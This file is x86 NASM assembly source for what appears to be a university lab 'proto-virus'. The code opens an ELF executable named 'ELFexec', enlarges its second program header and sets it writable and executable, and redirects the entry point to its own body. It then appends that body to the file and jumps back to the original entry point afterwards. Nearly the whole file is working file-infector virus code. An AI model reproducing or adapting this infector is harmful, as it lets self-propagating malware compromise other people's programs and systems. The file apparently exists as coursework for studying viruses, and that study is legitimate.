%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%macro getLoc 1
	get_my_loc
	sub ecx, next_i - %1
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8

%define File_Descriptor [ebp-4]
%define PHeader_offset [ebp-28]
%define Entry_Point [ebp-32]
%define File_size [ebp-60]
%define virtAddr [ebp-88]
%define PHLoad_Offset [ebp-92]
%define Prev_Entry_Point [ebp-100]
%define PH2_Offset [ebp-132]
%define virtAddr2 [ebp-128]
%define Filesiz [ebp-120]
%define Memsiz [ebp-116]
%define PH_Flags [ebp-112]


	
	global _start

	section .text
_start:	
	push	ebp
	mov	ebp, esp
	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage


; You code for this lab goes here

call get_my_loc
sub ecx, next_i - OutStr		; getting relative address of OutStr
write 1, ecx, 32				; acts as 'write(stdout, [OutStr], 32)'

openFile: ; open the file
	call get_my_loc
	sub ecx, next_i - FileName		; getting relative address of FileName
	mov eax, ecx					; ecx is being changed in macro syscall3 before we use the address we stored here,
									; eax used last so it will be reserved correctrly
	open eax, RDWR, 0777			; acts as 'open("ELFexec", RDWR, 0777)
	mov File_Descriptor, eax		; store on stack the return value, which is the file descriptor

	mov eax, File_Descriptor		; is neccessery?
	cmp eax, 0
	jl printErr						; ???


loadFileHeader: ; load file header
	sub ebp, 56						; make room for header
	read eax, ebp, 52				; reads 80bytes from file of file descriptor(eax) into the stack as a buffer (ebp)
	cmp eax, 0
	jl printErr						; 
	mov esi, ebp					; store header in esi
	add ebp, 56						; clean header from the stack

CheckELF: ; check the file is ELF file
	mov ebx, esi
	inc ebx
	cmp byte [ebx], 69				; cmp e_ident[1] with 'E'
	jnz printErr
	inc ebx
	cmp byte [ebx], 76				; cmp e_ident[2] with 'L'
	jne printErr
	inc ebx
	cmp byte [ebx], 70				; cmp e_ident[3] with 'F'
	jne printErr

getSize:					 		; find the size of the file, in order to use it as offset when writing virus
	mov eax, File_Descriptor        ; load file descriptor from stak
	lseek eax, 0, SEEK_END
	mov File_size, eax				; store file size on stack 

loadFirstPHeader: 					; load program headers
	mov eax, File_Descriptor        ; load file descriptor from stak
	mov ebx, PHeader_offset			; get PHeader_offset
	lseek eax, ebx, SEEK_SET 		; go to the PHeader
	mov eax, File_Descriptor
	sub ebp, 96						; make room for program headers
	read eax, ebp, 32 				; PH in 64-96
	add ebp, 96						; 

loadSecondPHeader: 					; load program headers
	mov eax, File_Descriptor        ; load file descriptor from stak
	mov ebx, PHeader_offset			; get PHeader_offset
	add ebx, 32
	lseek eax, ebx, SEEK_SET 		; go to the PHeader
	mov eax, File_Descriptor
	sub ebp, 136					; make room for program headers
	read eax, ebp, 32 				; PH in 104-136
	add ebp, 136					; 

modifySecondPHeader:
	mov eax, File_size
	add eax, virus_end-_start
	sub eax, PH2_Offset
	mov Filesiz, eax
	mov Memsiz, eax
	mov dword PH_Flags, 7
	mov ebx, PHeader_offset
	add ebx, 32
	lseek File_Descriptor, ebx, SEEK_SET
	mov ebx, ebp
	sub ebx, 136
	write File_Descriptor, ebx, 32

modifyEntryPoint:
	mov eax, virtAddr2				; eax points to program header
	add eax, File_size				; 
	sub eax, PH2_Offset
	mov ebx, Entry_Point
	mov Prev_Entry_Point, ebx
	mov Entry_Point, eax
	mov eax, File_Descriptor
	lseek eax, 24, SEEK_SET
	mov eax, File_Descriptor
	test:
	mov ebx, ebp
	sub ebx, 32
	write eax, ebx, 4

writeVirus:							; write the virus to the end of the file
	mov eax, File_Descriptor
	lseek eax, 0, SEEK_END
	call get_my_loc
	sub ecx, next_i-_start
	mov eax, File_Descriptor
	write eax, ecx, virus_end-_start

setPrevEntryPoint:
	lseek File_Descriptor, -4, SEEK_END
	mov ebx , ebp 
	sub ebx,  100
	write File_Descriptor , ebx, 4

; close the file
closeFile:
	mov eax, File_Descriptor
	close eax

; check if closed with no error
;cmp eax, 0
;jl printErr
;jmp VirusExit

jump:
	call get_my_loc
	sub ecx, next_i-PreviousEntryPoint
	jmp [ecx]

VirusExit:
    exit 0            				; Termination if all is OK and no previous code to jump to
                    				; (also an example for use of above macros)

printErr:
	call get_my_loc
	sub ecx, next_i-PreviousEntryPoint
	jmp [ecx]


	
FileName:	db "ELFexec", 0
OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
Failstr:    db "perhaps not", 10 , 0

get_my_loc:
	call next_i
next_i:
	pop ecx
	ret

PreviousEntryPoint: dd VirusExit
virus_end:


